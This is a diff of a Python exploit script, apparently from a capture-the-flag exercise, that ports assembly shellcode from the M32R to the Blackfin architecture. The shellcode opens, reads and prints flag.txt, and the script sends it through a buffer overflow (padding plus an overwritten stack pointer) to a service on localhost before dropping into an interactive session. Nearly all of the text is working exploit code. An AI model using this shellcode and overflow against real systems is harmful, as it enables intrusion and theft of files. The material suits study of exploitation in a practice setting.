@@ -1,46 +1,40 @@
 asm = '''.section .text
 .global _start
-
 .ascii "%s"
 _start:
-  bl get_addr
+    JUMP get_addr
 ret:
-  push lr
-  pop r8
+    R3 = RETS
 open:
-  push r8
-  pop r1
-  xor r5, r5
-  push r5
-  pop r2
-  push r5
-  pop r3
-  ldi r0, #2
-  trap #0
+    R0 = R3
+    R1 = 0
+    R2 = R1
+	P0	= 5
+	EXCPT	0
 read:
-  push r0
-  pop r1
-  push r8
-  pop r2
-  ldi r3, #0x7f
-  ldi r0, #4
-  trap #0
+    R1 = R7
+    R2 = 0x7f
+	P0	= 3
+	EXCPT	0
 write:
-  ldi r3, #0x7f
-  push r8
-  pop r2
-  ldi r1, #1
-  ldi r0, #5
-  trap #0
+    R0.H = 0
+    R0.L = 1
+    R1 = R7
+    R2 = 0x7f
+	P0	= 4
+	EXCPT	0
+exit:
+	P0	= 1
+	EXCPT	0
 get_addr:
-  bl ret
+    CALL ret
 .ascii "%s"
-  '''
+'''
+
 import os
 from lib.mylib import *
 
-
-ARCH = 'm32r'
+ARCH = 'bfin'
 AS = ARCH + '-elf-as'
 OBJDUMP = ARCH + '-elf-objdump'
 FLAG = 'flag.txt'
@@ -58,10 +52,16 @@ shellcode = shellcode + FLAG + '\x00'
 xxd(shellcode)
 
 IP = '127.0.0.1'
-PORT = 10007
+PORT = 10014
 s = mysock(IP, PORT)
-s.send('\n000')
-SP = 0x1b0c
-shellcode = 'AAAAAAAAAAAAAAAA' + pb(SP) + shellcode + '\n'
+sl(s, '\n000')
+SP = 0x1b00
+shellcode = 'AAAAAAAAAAAAAAAA' + p(SP) + shellcode + '\n'
 sl(s, shellcode)
 shell(s)
+
+'''
+target sim --environment user
+load bin/easy/bfin-elf.x
+r
+'''
